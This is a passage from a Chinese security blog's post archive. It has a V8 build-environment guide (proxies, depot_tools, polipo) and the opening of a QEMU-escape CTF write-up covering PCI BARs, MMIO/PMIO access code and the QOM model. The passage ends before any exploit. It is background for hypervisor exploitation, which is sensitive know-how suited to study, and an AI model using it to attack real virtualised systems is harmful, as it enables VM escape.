    <title>v8编译踩坑记</title>
    <url>/2020/09/03/v8_compile/</url>
    <content><![CDATA[<h1 id="v8编译踩坑记"><a href="#v8编译踩坑记" class="headerlink" title="v8编译踩坑记"></a>v8编译踩坑记</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>打算看姚老板的博客学下oob，试图编译v8，结果踩了一堆坑，linux遇到问题之后求助P1umer，改成了win，win那边也是问题连连，决定还是改回linux，下面就记录一下v8编译的一些问题及解决方法</p>
<h2 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h2><p>我宿主机用的是SSR，代理端口为1080，虚拟机设置NAT，SSR允许局域网代理，在宿主机查看一下本机ip<code>192.168.*.*</code>，两边互ping一下即可。</p>
<p>git的代理可以直接设置socks5代理，命令如下<code>git config --global http.proxy &quot;socks5://192.168.*.*:1080&quot;</code>，不过socks5代理后面会出问题，这里可以先用socks5</p>
<p>终端代理可以设置export临时用，也可以在~/.bashrc中添加export再source长久使用，命令位<code>export http_proxy=&quot;socks5://192.168.*.*:1080&quot;</code>以及<code>export https_proxy=$http_proxy</code>或者<code>export ALL_PROXY=&quot;socks5://192.168.*.*:1080&quot;</code>一条同时设置http和https。</p>
<h2 id="安装depot-tools"><a href="#安装depot-tools" class="headerlink" title="安装depot_tools"></a>安装depot_tools</h2><p>从github中下载repo即可，之后添加环境变量到终端配置文件中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'export PATH=$PATH:"/path/to/depot_tools"'</span> &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure>
<h2 id="安装ninja"><a href="#安装ninja" class="headerlink" title="安装ninja"></a>安装ninja</h2><p>从github下repo，同样要添加环境变量</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/ninja-build/ninja.git</span><br><span class="line"><span class="built_in">cd</span> ninja &amp;&amp; ./configure.py --bootstrap &amp;&amp; <span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'export PATH=$PATH:"/path/to/ninja"'</span> &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure>
<h2 id="编译v8"><a href="#编译v8" class="headerlink" title="编译v8"></a>编译v8</h2><p><code>gclient</code>初始化工具集失败，提示有<code>Bootstrapping cipd client</code>，报错原因<code>curl: (35) gnutls_handshake() failed: The TLS connection was non-properly terminated</code>，具体原因是curl不能通过代理成功连接到主机，根本原因是proxychains使用socks5协议，但是cipd不支持，下面有两个解决方案，一是手动安装cipd，另一个是将socks5协议转http协议，我参考的是<a href="https://www.cnblogs.com/hcbin/p/8630143.html" target="_blank" rel="noopener">这篇文章</a></p>
<h2 id="socks5转http"><a href="#socks5转http" class="headerlink" title="socks5转http"></a>socks5转http</h2><p>下载polipo</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/jech/polipo.git</span><br></pre></td></tr></table></figure>
<p>安装<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> polipo</span><br><span class="line">sudo make all</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure></p>
<p>新建文件<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/polipo.conf</span><br></pre></td></tr></table></figure></p>
<p>添加以下内容(我这里将宿主机的socks5转到了虚拟机的localhost:8090)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">daemonise = false</span><br><span class="line">pidFile = /tmp/polipo.pid</span><br><span class="line">proxyAddress=&quot;0.0.0.0&quot;</span><br><span class="line">proxyPort=8090</span><br><span class="line">socksParentProxy = &quot;192.168.86.1:1080&quot;</span><br><span class="line">socksProxyType = socks5</span><br><span class="line">diskCacheRoot = &quot;&quot;</span><br></pre></td></tr></table></figure>
<p>换个终端执行polipo</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/<span class="built_in">local</span>/bin/polipo -c /etc/polipo.conf</span><br></pre></td></tr></table></figure>
<h2 id="设置depot-tools代理"><a href="#设置depot-tools代理" class="headerlink" title="设置depot_tools代理"></a>设置depot_tools代理</h2><p>不设置的话download_from_google_storage会提示NO_AUTH_BOTO_CONFIG</p>
<p>新建文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/gclient_boto.cfg</span><br></pre></td></tr></table></figure>
<p>添加如下内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Boto]</span><br><span class="line">proxy = 127.0.0.1</span><br><span class="line">proxy_port = 8090</span><br></pre></td></tr></table></figure>
<p>终端设置变量</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> NO_AUTH_BOTO_CONFIG=/etc/gclient_boto.cfg</span><br></pre></td></tr></table></figure>
<h2 id="设置git"><a href="#设置git" class="headerlink" title="设置git"></a>设置git</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global core.packedgitlimit 10g</span><br><span class="line">git config --global core.packedgitwindowsize 10g</span><br><span class="line">git config --global core.bigfilethreshold 10g</span><br><span class="line">git config --global core.compression 0</span><br><span class="line">git config --global core.autocrlf <span class="literal">false</span></span><br><span class="line">git config --global core.filemode <span class="literal">false</span></span><br><span class="line">git config --global pack.deltacachesize 10g</span><br><span class="line">git config --global pack.packsizelimit 10g</span><br><span class="line">git config --global pack.windowmemory 10g</span><br><span class="line">git config --global pack.threads 4</span><br></pre></td></tr></table></figure>
<h2 id="下载源码-amp-amp-编译"><a href="#下载源码-amp-amp-编译" class="headerlink" title="下载源码 &amp;&amp; 编译"></a>下载源码 &amp;&amp; 编译</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir v8</span><br><span class="line"><span class="built_in">cd</span> v8 </span><br><span class="line">fetch v8</span><br><span class="line">tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C out.gn/x64.debug</span><br></pre></td></tr></table></figure>
<p>编译的二进制文件为d8，位于<code>./out.gn/x64.debug/d8</code></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://p1umer.github.io/2018/07/01/V8-Environmental-Configuration/" target="_blank" rel="noopener">P1umer</a></p>
<p><a href="https://www.cnblogs.com/hcbin/p/8630143.html" target="_blank" rel="noopener">HCBin</a></p>
<p><a href="https://mem2019.github.io/jekyll/update/2019/07/18/V8-Env-Config.html" target="_blank" rel="noopener">holing</a></p>
]]></content>
      <categories>
        <category>v8</category>
      </categories>
  </entry>
  <entry>
    <title>qemu逃逸初探</title>
    <url>/2020/09/03/strng/</url>
    <content><![CDATA[<h1 id="qemu逃逸初探"><a href="#qemu逃逸初探" class="headerlink" title="qemu逃逸初探"></a>qemu逃逸初探</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天是19年的最后一天，本来想发点总结的，合计了一下发现没什么能说的，还是算了，做一下很久之前就想做的题。基本是复现ray-cp师傅的做题过程，中间还有些疑惑的地方。</p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="地址转换"><a href="#地址转换" class="headerlink" title="地址转换"></a>地址转换</h3><p>大概看了三道题，题目都是自己写个设备，和qemu共同编译，之后指定这个设备作为device。通过设备的读写漏洞进行逃逸。<br>首先是qemu相关的内存映射，我们的虚拟机分配一块内存(在启动qemu的脚本中指定)给qemu进程，这块地址是我们虚拟机的虚拟地址，却是qemu作为一个模拟系统中的物理地址，这个地址再通过地址映射的方式分配给其中的进程使用。图如下所示(抄自ray-cp师傅)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Guest&apos; processes</span><br><span class="line">                     +--------------------+</span><br><span class="line">Virtual addr space   |                    |</span><br><span class="line">                     +--------------------+</span><br><span class="line">                     |                    |</span><br><span class="line">                     \__   Page Table     \__</span><br><span class="line">                        \                    \</span><br><span class="line">                         |                    |  Guest kernel</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">Guest&apos;s phy. memory |    |                    |                |</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">                    |                                          |</span><br><span class="line">                    \__                                        \__</span><br><span class="line">                       \                                          \</span><br><span class="line">                        |             QEMU process                 |</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">Virtual addr space |    |                                          |</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">                   |                                               |</span><br><span class="line">                    \__                Page Table                   \__</span><br><span class="line">                       \                                               \</span><br><span class="line">                        |                                               |</span><br><span class="line">                   +----+-----------------------------------------------++</span><br><span class="line">Physical memory    |    |                                               ||</span><br><span class="line">                   +----+-----------------------------------------------++</span><br></pre></td></tr></table></figure>
<p>如果我们在qemu虚拟机里申请一段地址空间mem，则可以先用qemu里的地址映射计算出其在qemu物理内存地址(在qemu内部查看二进制程序的map基址加上申请地址的偏移)，进而将这个地址作为偏移加上在VMWare内查看map得到的qemu进程基址算出mem在虚拟机的实际地址。  </p>
<h3 id="pci设备空间"><a href="#pci设备空间" class="headerlink" title="pci设备空间"></a>pci设备空间</h3><p>pci设备有一个配置空间记录设备的详细信息。大小为256字节，前64字节是PCI标准规定的。前16个字节的格式是固定的，包含头部的类型、设备种类、设备的性质以及制造商等，格式如下：</p>
<p><img src="/2020/09/03/strng/1.png" alt="pci config space"></p>
<p>比较关键的是其6个BAR(Base Address Registers)，BAR记录了设备所需要的地址空间的类型，基址以及其他属性。BAR的格式如下：</p>
<p><img src="/2020/09/03/strng/2.png" alt="bar"></p>
<p>设备可以申请两类地址空间，memory space和I/O space，用BAR的最后一位区别开。<br>当BAR最后一位为0表示这是映射的I/O内存，为1是表示这是I/O端口，当是I/O内存的时候1-2位表示内存的类型，bit 2为1表示采用64位地址，为0表示采用32位地址。bit1为1表示区间大小超过1M，为0表示不超过1M。bit3表示是否支持可预取。<br>而相对于I/O内存，当最后一位为1时表示映射的I/O端口。I/O端口一般不支持预取，所以这里是29位的地址。<br>通过memory space访问设备I/O的方式称为memory mapped I/O，即MMIO，这种情况下，CPU直接使用普通访存指令即可访问设备I/O。<br>通过I/O space访问设备I/O的方式称为port I/O，或者port mapped I/O，这种情况下CPU需要使用专门的I/O指令如IN/OUT访问I/O端口。<br>在MMIO中，内存和I/O设备共享同一个地址空间。 MMIO是应用得最为广泛的一种I/O方法，它使用相同的地址总线来处理内存和I/O设备，I/O设备的内存和寄存器被映射到与之相关联的地址。当CPU访问某个内存地址时，它可能是物理内存，也可以是某个I/O设备的内存，用于访问内存的CPU指令也可来访问I/O设备。每个I/O设备监视CPU的地址总线，一旦CPU访问分配给它的地址，它就做出响应，将数据总线连接到需要访问的设备硬件寄存器。为了容纳I/O设备，CPU必须预留给I/O一个地址区域，该地址区域不能给物理内存使用。</p>
<p>在PMIO中，内存和I/O设备有各自的地址空间。 端口映射I/O通常使用一种特殊的CPU指令，专门执行I/O操作。在Intel的微处理器中，使用的指令是IN和OUT。这些指令可以读/写1,2,4个字节（例如：outb, outw, outl）到IO设备上。I/O设备有一个与内存不同的地址空间，为了实现地址空间的隔离，要么在CPU物理接口上增加一个I/O引脚，要么增加一条专用的I/O总线。由于I/O地址空间与内存地址空间是隔离的，所以有时将PMIO称为被隔离的IO(Isolated I/O)。</p>
<h3 id="查看pci设备"><a href="#查看pci设备" class="headerlink" title="查看pci设备"></a>查看pci设备</h3><p>lspci命令用于显示当前主机的所有PCI总线信息，以及所有已连接的PCI设备信息。</p>
<p>pci设备的寻址是由总线、设备以及功能构成。如下所示：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci</span><br><span class="line">00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)</span><br><span class="line">00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]</span><br><span class="line">00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]</span><br><span class="line">00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)</span><br><span class="line">00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)</span><br><span class="line">00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</span><br><span class="line">00:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03)</span><br></pre></td></tr></table></figure></p>
<p>xx:yy:z的格式为总线:设备:功能的格式。</p>
<p>PCI 设备通过VendorIDs、DeviceIDs、以及Class Codes字段区分：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci -v -m -n -s 00:03.0</span><br><span class="line">Device: 00:03.0</span><br><span class="line">Class:  00ff</span><br><span class="line">Vendor: 1234</span><br><span class="line">Device: 11e9</span><br><span class="line">SVendor:        1af4</span><br><span class="line">SDevice:        1100</span><br><span class="line">PhySlot:        3</span><br><span class="line">Rev:    10</span><br></pre></td></tr></table></figure>
<p>查看设备的内存空间：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci -v -s 00:03.0 -x</span><br><span class="line">00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</span><br><span class="line">        Subsystem: Red Hat, Inc Device 1100</span><br><span class="line">        Physical Slot: 3</span><br><span class="line">        Flags: fast devsel</span><br><span class="line">        Memory at febf1000 (32-bit, non-prefetchable) [size=256]</span><br><span class="line">        I/O ports at c050 [size=8]</span><br><span class="line">00: 34 12 e9 11 03 01 00 00 10 00 ff 00 00 00 00 00</span><br><span class="line">10: 00 10 bf fe 51 c0 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">20: 00 00 00 00 00 00 00 00 00 00 00 00 f4 1a 00 11</span><br><span class="line">30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>
<p>可以看到该设备有两个空间：BAR0为MMIO空间，地址为febf1000，大小为256；BAR1为PMIO空间，端口地址为0xc050，大小为8。</p>
<p>我们还可以通过resource文件来查看内存空间</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ ls -la /sys/devices/pci0000\:00/0000\:00\:03.0/</span><br><span class="line">total 0</span><br><span class="line">drwxr-xr-x  3 root root    0 Dec 31 11:13 .</span><br><span class="line">drwxr-xr-x 11 root root    0 Dec 31 11:13 ..</span><br><span class="line">-rw-r--r--  1 root root 4096 Dec 31 15:29 broken_parity_status</span><br><span class="line">-r--r--r--  1 root root 4096 Dec 31 15:29 class</span><br><span class="line">-rw-r--r--  1 root root  256 Dec 31 15:29 config</span><br><span class="line">-r--r--r--  1 root root 4096 Dec 31 15:29 consistent_dma_mask_bits</span><br><span class="line">-rw-r--r--  1 root root 4096 Dec 31 15:29 d3cold_allowed</span><br><span class="line">-r--r--r--  1 root root 4096 Dec 31 15:29 device</span><br><span class="line">-r--r--r--  1 root root 4096 Dec 31 15:29 dma_mask_bits</span><br><span class="line">-rw-r--r--  1 root root 4096 Dec 31 15:29 enable</span><br><span class="line">lrwxrwxrwx  1 root root    0 Dec 31 15:29 firmware_node -&gt; ../../LNXSYSTM:00/device:00/PNP0A03:00/device:06</span><br><span class="line">-r--r--r--  1 root root 4096 Dec 31 11:13 irq</span><br><span class="line">-r--r--r--  1 root root 4096 Dec 31 15:29 local_cpulist</span><br><span class="line">-r--r--r--  1 root root 4096 Dec 31 15:29 local_cpus</span><br><span class="line">-r--r--r--  1 root root 4096 Dec 31 15:29 modalias</span><br><span class="line">-rw-r--r--  1 root root 4096 Dec 31 15:29 msi_bus</span><br><span class="line">drwxr-xr-x  2 root root    0 Dec 31 15:29 power</span><br><span class="line">--w--w----  1 root root 4096 Dec 31 15:29 remove</span><br><span class="line">--w--w----  1 root root 4096 Dec 31 15:29 rescan</span><br><span class="line">-r--r--r--  1 root root 4096 Dec 31 15:29 resource</span><br><span class="line">-rw-------  1 root root  256 Dec 31 11:18 resource0</span><br><span class="line">-rw-------  1 root root    8 Dec 31 15:29 resource1</span><br><span class="line">lrwxrwxrwx  1 root root    0 Dec 31 15:29 subsystem -&gt; ../../../bus/pci</span><br><span class="line">-r--r--r--  1 root root 4096 Dec 31 15:29 subsystem_device</span><br><span class="line">-r--r--r--  1 root root 4096 Dec 31 15:29 subsystem_vendor</span><br><span class="line">-rw-r--r--  1 root root 4096 Dec 31 11:13 uevent</span><br><span class="line">-r--r--r--  1 root root 4096 Dec 31 15:29 vendor</span><br></pre></td></tr></table></figure>
<p><code>resoucre</code>文件包含其它相应空间的数据，如resource0（MMIO空间）以及resource1（PMIO空间）</p>
<p>每行代表起始地址、结束地址以及标志位</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ cat /sys/devices/pci0000\:00/0000\:00\:03.0/resource</span><br><span class="line">0x00000000febf1000 0x00000000febf10ff 0x0000000000040200</span><br><span class="line">0x000000000000c050 0x000000000000c057 0x0000000000040101</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure>
<h3 id="qemu访问I-O空间"><a href="#qemu访问I-O空间" class="headerlink" title="qemu访问I/O空间"></a>qemu访问I/O空间</h3><h4 id="访问mmio"><a href="#访问mmio" class="headerlink" title="访问mmio"></a>访问mmio</h4><p>编写内核模块，可以在内核态访问mmio空间，demo如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ioport.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">long</span> addr=ioremap(ioaddr,iomemsize);</span><br><span class="line">readb(addr);</span><br><span class="line">readw(addr);</span><br><span class="line">readl(addr);</span><br><span class="line">readq(addr);</span><br><span class="line"></span><br><span class="line">writeb(val,addr);</span><br><span class="line">writew(val,addr);</span><br><span class="line">writel(val,addr);</span><br><span class="line">writeq(val,addr);</span><br><span class="line">iounmap(addr);</span><br></pre></td></tr></table></figure>
<p>用户态访问主要是通过映射resource0文件实现访问，给定地址可以直接赋值或者取值。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:04.0/resource0"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">"mmio_fd open failed"</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">"mmap mmio_mem failed"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mmio_mem @ %p\n"</span>, mmio_mem);</span><br><span class="line"></span><br><span class="line">    mmio_read(<span class="number">0x128</span>);</span><br><span class="line">        mmio_write(<span class="number">0x128</span>, <span class="number">1337</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="访问pmio"><a href="#访问pmio" class="headerlink" title="访问pmio"></a>访问pmio</h4><p>内核态访问使用in<em>/out</em>函数访问某个端口</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/io.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ioport.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">inb(port);  <span class="comment">//读取一字节</span></span><br><span class="line">inw(port);  <span class="comment">//读取两字节</span></span><br><span class="line">inl(port);  <span class="comment">//读取四字节</span></span><br><span class="line"></span><br><span class="line">outb(val,port); <span class="comment">//写一字节</span></span><br><span class="line">outw(val,port); <span class="comment">//写两字节</span></span><br><span class="line">outl(val,port); <span class="comment">//写四字节</span></span><br></pre></td></tr></table></figure>
<p>用户态访问要先调用<code>iopl</code>申请访问大于0x3ff的端口</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h &gt;</span></span></span><br><span class="line"></span><br><span class="line">iopl(<span class="number">3</span>); </span><br><span class="line">inb(port); </span><br><span class="line">inw(port); </span><br><span class="line">inl(port);</span><br><span class="line"></span><br><span class="line">outb(val,port); </span><br><span class="line">outw(val,port); </span><br><span class="line">outl(val,port);</span><br></pre></td></tr></table></figure>
<h3 id="QOM编程模型"><a href="#QOM编程模型" class="headerlink" title="QOM编程模型"></a>QOM编程模型</h3><p>QEMU提供了一套面向对象编程的模型——QOM（QEMU Object Module），几乎所有的设备如CPU、内存、总线等都是利用这一面向对象的模型来实现的。</p>
<p>有几个结构体比较关键，<code>TypeInfo</code>、<code>TypeImpl</code>、<code>ObjectClass</code>以及<code>Object</code>。</p>
<p><code>TypeInfo</code>是用户用来定义一个Type的数据结构，用户定义一个<code>TypeInfo</code>，然后调用<code>type_register(TypeInfo)</code>或者<code>type_register_static(TypeInfo)</code>函数，就会生成相应的TypeImpl实例，将这个<code>TypeInfo</code>注册到全局的<code>TypeImpl</code>的<code>hash</code>表中。</p>
<p><code>TypeImpl</code>的属性与TypeInfo的属性对应，实际上qemu就是通过用户提供的TypeInfo创建的TypeImpl对象。如下面定义的<code>pci_test_dev</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> TypeInfo pci_testdev_info = &#123;</span><br><span class="line">        .name          = TYPE_PCI_TEST_DEV,</span><br><span class="line">        .parent        = TYPE_PCI_DEVICE,</span><br><span class="line">        .instance_size = <span class="keyword">sizeof</span>(PCITestDevState),</span><br><span class="line">        .class_init    = pci_testdev_class_init,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">TypeImpl *<span class="title">type_register_static</span><span class="params">(<span class="keyword">const</span> TypeInfo *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> type_register(info);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">TypeImpl *<span class="title">type_register</span><span class="params">(<span class="keyword">const</span> TypeInfo *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    assert(info-&gt;parent);</span><br><span class="line">    <span class="keyword">return</span> type_register_internal(info);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> TypeImpl *<span class="title">type_register_internal</span><span class="params">(<span class="keyword">const</span> TypeInfo *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TypeImpl *ti;</span><br><span class="line">    ti = type_new(info);</span><br><span class="line">    type_table_add(ti);</span><br><span class="line">    <span class="keyword">return</span> ti;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当所有qemu总线、设备等的<code>type_register_static</code>执行完成后，即它们的<code>TypeImpl</code>实例创建成功后，qemu就会在<code>type_initialize</code>函数中实例化其对应的<code>ObjectClass</code>。</p>
<p>每个<code>type</code>都有一个相应的ObjectClass对应，它是所有类的基类。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ObjectClass</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    Type type;  </span><br><span class="line">    GSList *interfaces;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *object_cast_cache[OBJECT_CLASS_CAST_CACHE];</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *class_cast_cache[OBJECT_CLASS_CAST_CACHE];</span><br><span class="line">    ObjectUnparent *unparent;</span><br><span class="line">    GHashTable *properties;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>用户可以定义自己的类，继承相应类即可。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* include/qom/object.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">TypeImpl</span> *<span class="title">Type</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ObjectClass</span> <span class="title">ObjectClass</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ObjectClass</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">        Type type;       <span class="comment">/* points to the current Type's instance */</span></span><br><span class="line">        ...</span><br><span class="line"><span class="comment">/* include/hw/qdev-core.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DeviceClass</span> &#123;</span></span><br><span class="line">        <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">        ObjectClass parent_class;</span><br><span class="line">        <span class="comment">/*&lt; public &gt;*/</span></span><br><span class="line">        ...</span><br><span class="line"><span class="comment">/* include/hw/pci/pci.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">PCIDeviceClass</span> &#123;</span></span><br><span class="line">        DeviceClass parent_class;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>
<p>可以看到类的定义中父类都在第一个字段，使得可以父类与子类直接实现转换。一个类初始化时会先初始化它的父类，父类初始化完成后，会将相应的字段拷贝至子类同时将子类其余字段赋值为0，再进一步赋值。同时也会继承父类相应的虚函数指针，当所有的父类都初始化结束后，<code>TypeInfo::class_init</code>会调用以实现虚函数的初始化，如下面的<code>pci_testdev_class_init</code>:</p>
